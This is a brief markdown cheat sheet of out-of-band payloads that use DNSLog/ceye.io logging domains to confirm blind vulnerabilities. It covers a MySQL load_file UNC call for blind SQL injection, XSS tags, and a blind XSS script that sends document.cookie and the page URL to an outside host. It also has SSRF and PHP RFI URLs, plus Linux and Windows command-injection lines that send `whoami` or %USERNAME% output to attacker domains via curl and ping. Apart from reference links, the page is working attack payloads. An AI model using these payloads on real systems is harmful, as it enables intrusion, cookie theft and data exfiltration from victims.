#

## Blind sqli

```sql
select load_file('\\\\afanti.xxxx.ceye.io\\aaa');
```

## XSS

Payload1: 
```javascript
><img src=http://xss.xxxx.ceye.io/log/xss001>
```

blind Payload2: 
```javascript
var s=document.createElement('img');
s.src="http://xss.test.dnslog.link/?url="+document.location+"&cookie="+document.cookie;
document.head.appendChild(s);
```

## SSRF

```
http://xss.xxxx.ceye.io/payload/phprfi

```

## php RFI

```
http://xss.xxxx.ceye.io/aaa
```

## RCE

linux/unix:

```bash
curl http://haha.xxx.ceye.io/`whoami`
ping `whoami`.xxxx.ceye.io
```

windows:

```bash
ping %USERNAME%.xxx.ceye.io
```

## XXE

see <http://ceye.io/payloads> XXE


## Others
 
see <http://ceye.io/payloads> XXE

## Reference

<https://www.cnblogs.com/rnss/p/11320305.html>
<http://ceye.io/payloads>
<http://foreversong.cn/archives/861>
<https://bbs.ichunqiu.com/thread-22002-1-1.html>
<http://blog.knownsec.com/2016/06/how-to-scan-and-check-vulnerabilities/>
<https://www.freebuf.com/column/184587.html>
<https://blog.51cto.com/tar0cissp/2337779>
<https://github.com/BugScanTeam/DNSLog>